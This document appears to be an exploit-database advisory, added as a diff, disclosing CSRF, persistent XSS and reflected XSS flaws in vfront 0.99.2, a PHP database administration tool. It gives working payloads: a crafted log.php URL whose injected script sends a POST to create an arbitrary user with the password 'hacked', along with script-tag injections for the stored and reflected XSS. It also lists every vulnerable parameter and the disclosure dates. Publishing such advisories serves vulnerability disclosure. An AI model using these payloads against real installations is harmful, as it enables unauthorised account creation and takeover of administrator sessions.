@@ -1,0 +1,131 @@
+# Exploit Title:  CSRF & Persistent XSS
+# Google Dork: intitle: CSRF & Persistent XSS
+# Date: 2015-06-02
+# Exploit Author:  John Page (hyp3rlinx)
+# Website: hyp3rlinx.altervista.org/
+# Vendor Homepage: www.vfront.org
+# Software Link: www.vfront.org
+# Version: 0.99.2
+# Tested on: windows 7
+# Category: webapps
+
+
+Product:
+===================================================================================
+vfront-0.99.2 is a PHP web based MySQL & PostgreSQL database management application.
+
+
+
+Advisory Information:
+====================================
+CSRF, Persistent XSS & reflected XSS
+
+
+
+Vulnerability Detail(s):
+=======================
+
+
+CSRF:
+=========
+No CSRF token in place, therefore we can add arbitrary users to the system.
+
+
+Persistent XSS:
+================
+variabili.php has multiple XSS vectors using POST method, one input field 'altezza_iframe_tabella_gid' will store XSS payload
+into the MySQL database which will be run each time variabili.php is accessed from victims browser.
+
+
+Persisted XSS stored in MySQL DB:
+=================================
+DB-----> vfront_vfront
+TABLE-----> variabili
+COLUMN------> valore (will contain our XSS)
+
+
+Exploit code(s):
+===============
+
+
+CSRF code add arbitrary users to system:
+=======================================
+http://localhost/vfront-0.99.2/vfront-0.99.2/admin/log.php?op="/><script>var xhr%3dnew XMLHttpRequest();xhr.onreadystatechange%3dfunction(){if(xhr.status%3d%3d200){if(xhr.readyState%3d%3d4){alert(xhr.responseText);}}};xhr.open('POST','utenze.db.php?insert_new',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('nome%3dhyp3rlinxe%26cognome%3dapparitionsec%26email%3dx@x.com%26passwd%3dhacked%26passwd1%3dhacked');</script>&tabella=&uid=&data_dal=All&data_al=All
+
+
+
+Persistent XSS:
+================
+http://localhost/vfront-0.99.2/vfront-0.99.2/admin/variabili.php?feed=0&gidfocus=0
+Inject XSS into 'the altezza_iframe_tabella_gid' input field to store in database.
+"/><script>alert(666)</script>
+
+
+
+Reflected XSS(s):
+=================
+http://localhost/vfront-0.99.2/vfront-0.99.2/admin/query_editor.php?id=&id_table=&id_campo="/><script>alert(666)</script>
+
+
+
+XSS vulnerable input fields:
+============================
+http://localhost/vfront-0.99.2/vfront-0.99.2/admin/variabili.php
+altezza_iframe_tabella_gid   <------------- ( Persistent XSS )
+passo_avanzamento_veloce_gid
+n_record_tabella_gid
+search_limit_results_gid
+max_tempo_edit_gid
+home_redirect_gid
+formati_attach_gid
+default_group_ext_gid
+cron_days_min_gid
+
+  
+
+Disclosure Timeline:
+===================================
+
+
+Vendor Notification: May 31, 2015
+June 2, 2015 : Public Disclosure
+
+
+
+Severity Level:
+===================================
+High
+
+
+
+Description:
+==========================================================
+
+Request Method(s):
+                                [+]  GET & POST
+
+Vulnerable Product:
+                                [+]  vfront-0.99.2
+
+Vulnerable Parameter(s):
+                                [+] altezza_iframe_tabella_gid
+				    passo_avanzamento_veloce_gid
+				    n_record_tabella_gid
+				    search_limit_results_gid
+				    max_tempo_edit_gid
+				    home_redirect_gid
+				    formati_attach_gid
+				    default_group_ext_gid
+				    cron_days_min_gid
+				    id_campo
+				    op
+				   
+
+
+Affected Area(s):               [+]  Admin & MySQL DB
+
+===============================================================
+
+
+
+(hyp3rlinx)
